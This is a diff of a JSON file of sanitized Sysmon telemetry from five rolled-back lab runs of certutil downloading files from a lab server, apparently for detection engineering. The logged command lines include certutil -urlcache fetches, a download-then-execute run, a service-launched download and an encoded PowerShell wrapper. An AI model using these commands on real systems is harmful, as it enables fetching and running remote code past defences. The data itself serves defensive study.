@@ -1,94 +1,115 @@
 {
-  "source": {
-    "collector": "C:\\Tools\\collect-run.ps1",
-    "window_start": "2026-08-09T23:07:09.482Z",
-    "window_end": "2026-08-09T23:07:15.794Z",
-    "event_count_all_channels": 771,
-    "sysmon_event_count": 722,
-    "raw_events_json_sha256": "EE50609A6CD01E51A18DA1F5E01883FB0B73F864E896988B9D86748B2F285A33",
-    "raw_sysmon_evtx_sha256": "31B48F6F23E171111EB0EF8AD88CBFFB008229FD52AFE1C137452B99D78E7BFE"
+  "schema_version": 2,
+  "description": "Sanitized endpoint telemetry from the five accepted, separately rolled-back certutil remote-download runs.",
+  "common": {
+    "target": "WIN10-ANALYSIS",
+    "account": "NT AUTHORITY\\SYSTEM",
+    "certutil_image": "C:\\Windows\\System32\\certutil.exe",
+    "certutil_original_file_name": "CertUtil.exe",
+    "certutil_sha256": "FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2",
+    "sysmon_config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71"
   },
-  "process": {
-    "event_id": 1,
-    "utc_time": "2026-08-09T23:07:12.302Z",
-    "process_guid": "{d6daef74-0820-6a79-a900-000000000b00}",
-    "process_id": 3800,
-    "image": "C:\\Windows\\System32\\certutil.exe",
-    "original_file_name": "CertUtil.exe",
-    "file_version": "10.0.19041.5794 (WinBuild.160101.0800)",
-    "company": "Microsoft Corporation",
-    "command_line": "\"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://192.168.1.50:18080/benign-stage.bin C:\\lab\\downloaded.bin",
-    "current_directory": "C:\\lab\\",
-    "user": "NT AUTHORITY\\SYSTEM",
-    "integrity_level": "System",
-    "sha256": "FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2"
-  },
-  "parent_child": {
-    "event_id": 1,
-    "parent_process_guid": "{d6daef74-081f-6a79-a700-000000000b00}",
-    "parent_process_id": 4852,
-    "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-    "parent_command_line": "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand <lab-wrapper>",
-    "parent_user": "NT AUTHORITY\\SYSTEM"
-  },
-  "network": {
-    "event_id_3_count": 2,
-    "event_id_22_count": 0,
-    "dns_assessment": "No DNS query was expected or observed because the URL used an IP literal.",
-    "connections": [
-      {
-        "utc_time": "2026-08-09T23:07:12.327Z",
-        "process_guid": "{d6daef74-0820-6a79-a900-000000000b00}",
-        "image": "C:\\Windows\\System32\\certutil.exe",
-        "user": "NT AUTHORITY\\SYSTEM",
-        "protocol": "tcp",
-        "initiated": true,
-        "source_ip": "192.168.1.52",
-        "source_port": 49681,
-        "destination_ip": "192.168.1.50",
-        "destination_port": 18080
+  "runs": [
+    {
+      "id": "urlcache-no-split",
+      "window_start": "2026-08-10T14:31:42.132Z",
+      "window_end": "2026-08-10T14:31:43.664Z",
+      "collector_event_count": 42,
+      "raw_events_json_sha256": "8FE28027ACD0081F728713AB639D46E43C87E26F00E87428F60FACBC8D4C90AF",
+      "raw_sysmon_evtx_sha256": "5266315B3572CCE8C4AAA3BC03AD72B0F3F644F200B995B73718E0EF6B0B7E4B",
+      "process": {
+        "event_id_1": 1,
+        "process_id": 4584,
+        "process_guid": "{d6daef74-e0ce-6a79-bf00-000000000b00}",
+        "command_line": "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\\lab\\urlcache-no-split.txt",
+        "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
       },
-      {
-        "utc_time": "2026-08-09T23:07:12.340Z",
-        "process_guid": "{d6daef74-0820-6a79-a900-000000000b00}",
-        "image": "C:\\Windows\\System32\\certutil.exe",
-        "user": "NT AUTHORITY\\SYSTEM",
-        "protocol": "tcp",
-        "initiated": true,
-        "source_ip": "192.168.1.52",
-        "source_port": 49682,
-        "destination_ip": "192.168.1.50",
-        "destination_port": 18080
-      }
-    ]
-  },
-  "files": {
-    "event_id_11_count": 5,
-    "event_id_23_count": 1,
-    "creates": [
-      "C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\763615CF44773273F9760AA2E564716B",
-      "C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\763615CF44773273F9760AA2E564716B",
-      "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign-stage[1].bin",
-      "C:\\lab\\646026a8f83075db40e800040ef37c85742da5d0.key",
-      "C:\\lab\\downloaded.bin"
-    ],
-    "deleted": {
-      "target_filename": "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign-stage[1].bin",
-      "sha256": "92EE1BBE6EE3B6CC7CD6ED720B594C6C3394D362838DB8C02C6CA6732E94F86A",
-      "archived": true
+      "network": {"event_id_3": 2, "event_id_22": 0, "destination": "192.168.1.50:18081"},
+      "files": {
+        "certutil_event_id_11": 2,
+        "certutil_event_id_23": 2,
+        "creates": ["C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign-stage[1].txt", "C:\\lab\\urlcache-no-split.txt"],
+        "destination_sha256": "5B5EF4960B4580947F8FFC78316EE9238CFAB2D6C4A4311F8DD0EA171A201B44",
+        "cache_content_event": "none observed; the URL-cache content rule did not fire in this baseline state"
+      },
+      "registry": {"certutil_event_id_12": 10, "certutil_event_id_13": 11, "certutil_event_id_14": 0, "assessment": "Cryptography OID, tenant-restriction, and Internet Settings initialization; normal API state, not a standalone rule."}
     },
-    "assessment": "Certutil created its CryptnetUrlCache metadata/content pair, a transient INetCache copy, a SHA-1-named key file, and the requested destination; it then deleted the transient INetCache copy."
-  },
-  "registry": {
-    "event_id_12_count": 14,
-    "event_id_13_count": 14,
-    "event_id_14_count": 0,
-    "representative_targets": [
-      "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptDllFindOIDInfo\\1.3.6.1.4.1.311.60.3.1!7",
-      "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\TenantRestrictions\\Payload",
-      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass",
-      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Content\\CachePrefix"
-    ],
-    "assessment": "Certutil initialized cryptography OID and Internet Settings/cache state. The writes are legitimate API initialization behavior and were not distinctive enough for a standalone rule."
-  }
+    {
+      "id": "verifyctl",
+      "window_start": "2026-08-10T14:34:14.060Z",
+      "window_end": "2026-08-10T14:34:15.607Z",
+      "collector_event_count": 88,
+      "raw_events_json_sha256": "8651E4437BB741C1A780F0E1E4EA059F5357402692FAB84398DBB7DFE0E67945",
+      "raw_sysmon_evtx_sha256": "D2FEB842D48865AB5F016D5FC525147DE2B067BA75E0D36C8E11008106B80302",
+      "process": {
+        "event_id_1": 1,
+        "process_id": 5464,
+        "process_guid": "{d6daef74-e166-6a79-a600-000000000b00}",
+        "command_line": "\"C:\\Windows\\System32\\certutil.exe\" -verifyctl -f http://192.168.1.50:18081/benign-stage.txt C:\\lab\\",
+        "exit_code": -2146881269,
+        "exit_assessment": "The HTTP retrieval completed and populated CryptnetUrlCache; parsing then failed with CRYPT_E_ASN1_BADTAG because the fixture is inert text, not a CTL.",
+        "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "network": {"event_id_3": 1, "event_id_22": 0, "destination": "192.168.1.50:18081"},
+      "files": {"certutil_event_id_11": 2, "certutil_event_id_23": 0, "creates": ["CryptnetUrlCache\\MetaData\\A2F0C1B3447BB948C2FB74E562C40407", "CryptnetUrlCache\\Content\\A2F0C1B3447BB948C2FB74E562C40407"]},
+      "registry": {"certutil_event_id_12": 6, "certutil_event_id_13": 3, "certutil_event_id_14": 0, "assessment": "Normal cryptography and URL retrieval initialization."}
+    },
+    {
+      "id": "service-parent",
+      "window_start": "2026-08-10T14:36:27.098Z",
+      "window_end": "2026-08-10T14:36:28.801Z",
+      "collector_event_count": 134,
+      "raw_events_json_sha256": "89DAF7EC2A26EFB2532AD645DA8FF4DE6BAAB1D32AF2A58524D5CD4CFEE41BF5",
+      "raw_sysmon_evtx_sha256": "9D922F71E888D388B0421A76EAD40CFDAF84898D216CE4547E209F8AE775FC59",
+      "process": {
+        "event_id_1": 1,
+        "process_id": 5932,
+        "process_guid": "{d6daef74-e1eb-6a79-a700-000000000b00}",
+        "command_line": "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\\lab\\service-parent.txt",
+        "parent_image": "C:\\Windows\\System32\\services.exe",
+        "parent_command_line": "C:\\Windows\\system32\\services.exe",
+        "parent_user": "NT AUTHORITY\\SYSTEM"
+      },
+      "service_setup": {"name": "CertutilLabDownload", "startup": "demand", "start_result": "SCM reported that certutil is not service-aware after the child exited", "delete_exit_code": 0},
+      "network": {"event_id_3": 1, "event_id_22": 0, "destination": "192.168.1.50:18081", "zeek_connections": 2},
+      "files": {"certutil_event_id_11": 4, "certutil_event_id_23": 1, "creates": ["C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\A2F0C1B3447BB948C2FB74E562C40407", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\A2F0C1B3447BB948C2FB74E562C40407", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign-stage[1].txt", "C:\\lab\\service-parent.txt"], "destination": "C:\\lab\\service-parent.txt", "destination_sha256": "5B5EF4960B4580947F8FFC78316EE9238CFAB2D6C4A4311F8DD0EA171A201B44"},
+      "registry": {"certutil_event_id_12": 13, "certutil_event_id_13": 14, "certutil_event_id_14": 0, "service_registry_observed": true, "assessment": "The temporary service ImagePath and service values were observed in addition to certutil API state; snapshot rollback removed them."}
+    },
+    {
+      "id": "https",
+      "window_start": "2026-08-10T14:38:38.334Z",
+      "window_end": "2026-08-10T14:38:39.897Z",
+      "collector_event_count": 241,
+      "raw_events_json_sha256": "AE069E5FC33FAA05B57A94E826C4FC78A3BF579C3CD6F5F3E5F06C9879AA833D",
+      "raw_sysmon_evtx_sha256": "D2325530E2E3E8DC4D32B640F3194BACAE1ED48AE259BD64580F59B5A808610B",
+      "process": {"event_id_1": 1, "process_id": 4144, "process_guid": "{d6daef74-e26e-6a79-a900-000000000b00}", "command_line": "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\\lab\\https-stage.txt", "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+      "network": {"event_id_3": 2, "event_id_22": 0, "destination": "certutil.lab (192.168.1.50):18443"},
+      "files": {"certutil_event_id_11": 4, "certutil_event_id_23": 1, "creates": ["C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\C524166E05BEAD0423567CBB6B6281A0", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\C524166E05BEAD0423567CBB6B6281A0", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign-stage[1].txt", "C:\\lab\\https-stage.txt"], "destination": "C:\\lab\\https-stage.txt", "destination_sha256": "5B5EF4960B4580947F8FFC78316EE9238CFAB2D6C4A4311F8DD0EA171A201B44"},
+      "registry": {"certutil_event_id_12": 145, "certutil_event_id_13": 14, "certutil_event_id_14": 0, "assessment": "High-volume trust/Internet Settings initialization plus disposable certificate trust preparation; not a standalone rule."}
+    },
+    {
+      "id": "download-execute",
+      "window_start": "2026-08-10T14:42:41.902Z",
+      "window_end": "2026-08-10T14:42:43.511Z",
+      "collector_event_count": 202,
+      "raw_events_json_sha256": "7AF60C35F24DE2A6CD83B5CDC2E2C5E5482A2B2ECD3E925AF2D79C5FC1B7CAB7",
+      "raw_sysmon_evtx_sha256": "6C58220B7613F61FDEE9AF9573DF12DE6EED468FD4BA4FC053980CA588BB818D",
+      "process": {
+        "certutil_event_id_1": 1,
+        "certutil_process_id": 4044,
+        "certutil_process_guid": "{d6daef74-e362-6a79-d300-000000000b00}",
+        "certutil_command_line": "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://192.168.1.50:18081/inert-marker.exe C:\\lab\\inert-marker.exe",
+        "marker_event_id_1": 1,
+        "marker_process_id": 5436,
+        "marker_process_guid": "{d6daef74-e362-6a79-d400-000000000b00}",
+        "marker_image": "C:\\lab\\inert-marker.exe",
+        "marker_image_sha256": "4C42BCE005BCF18EBFE85229774D7A5221C5C8C30ACE4BFC031B23A47A7357A2",
+        "marker_exit_code": 0,
+        "parent_assessment": "Certutil and the PE are sibling children of the controlled PowerShell wrapper; correlation is temporal plus destination-path/image equality, not a direct certutil child."
+      },
+      "network": {"event_id_3": 2, "event_id_22": 0, "destination": "192.168.1.50:18081"},
+      "files": {"certutil_event_id_11": 4, "certutil_event_id_23": 1, "certutil_creates": ["C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\A8CA329B1DEDF9F5AE573DF0F5C4528A", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\A8CA329B1DEDF9F5AE573DF0F5C4528A", "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\inert-marker[1].exe", "C:\\lab\\inert-marker.exe"], "pe_size_bytes": 15360, "pe_sha256": "4C42BCE005BCF18EBFE85229774D7A5221C5C8C30ACE4BFC031B23A47A7357A2", "pe_is_executable": true, "marker_event_id_11": 1, "marker_path": "C:\\lab\\download-execute-marker.txt", "marker_size_bytes": 38, "marker_sha256": "8C9A46C85DC7DAEE170476FECF17186D4D5AA5D39C8176A805ED2F07CE16D0CE"},
+      "registry": {"certutil_event_id_12": 14, "certutil_event_id_13": 14, "certutil_event_id_14": 0, "assessment": "Normal certutil API initialization; the inert PE made no registry changes."}
+    }
+  ]
 }
